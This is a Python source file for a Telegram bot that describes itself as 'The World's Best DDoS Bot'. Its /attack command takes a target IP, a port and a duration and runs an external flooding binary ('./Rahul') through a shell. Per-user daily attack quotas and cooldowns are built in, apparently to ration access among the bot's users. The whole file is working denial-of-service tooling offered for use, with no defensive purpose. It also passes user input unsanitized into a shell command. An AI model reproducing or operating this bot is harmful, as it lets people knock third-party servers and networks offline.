#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN')

# Admin user IDs
admin_id = ["6005957043", "7962308718"]

# Default cooldown and attack limits
COOLDOWN_TIME = 80  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg", "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg", "https://envs.sh/gHR.jpg"
]

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Track the pending attack status globally
global_pending_attack = None

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time, global_pending_attack

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if global_pending_attack:
        bot.reply_to(message, "⚠️ **Wait for the ongoing attack to finish!**")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
        return

    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    full_command = f"./Rahul {target} {port} {time_duration} 900"

    # Attack Start Notification
    random_image = random.choice(image_urls)
    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    bot.send_photo(message.chat.id, random_image,
                   caption=f"🚀 Attack started on `{target}:{port}`\n⏳ Remaining time: {time_duration}s\n⚡ Remaining Attacks: {remaining_attacks}")

    global_pending_attack = user_id  

    try:
        subprocess.run(full_command, shell=True, check=True)
        send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ Error executing attack command: {e}")
        global_pending_attack = None

def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    global global_last_attack_time, global_pending_attack

    bot.send_message(message.chat.id,
                     f"✅ Attack Finished ✅\n🚀 Attack on `{target}:{port}` completed.\n⏳ Duration: {time_duration}s\n⚡ Remaining Attacks: {remaining_attacks}")

    global_last_attack_time = datetime.datetime.now()
    cooldown_end_time = global_last_attack_time + datetime.timedelta(seconds=COOLDOWN_TIME)

    cooldown_msg = bot.send_message(message.chat.id, f"⏳ Cooldown started... {COOLDOWN_TIME}s remaining")

    while datetime.datetime.now() < cooldown_end_time:
        remaining_cooldown = (cooldown_end_time - datetime.datetime.now()).seconds
        try:
            bot.edit_message_text(chat_id=message.chat.id,
                                  message_id=cooldown_msg.message_id,
                                  text=f"⏳ Cooldown: {remaining_cooldown}s remaining")
        except Exception as e:
            print(f"Error updating cooldown message: {e}")
        time.sleep(1)

    bot.send_message(message.chat.id, "🚀 **Cooldown Over! You can attack again!**")
    global_pending_attack = None

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = "Welcome to Your Home, Feel Free to Explore.\nThe World's Best DDoS Bot."
    bot.reply_to(message, response)

# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

load_users()

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)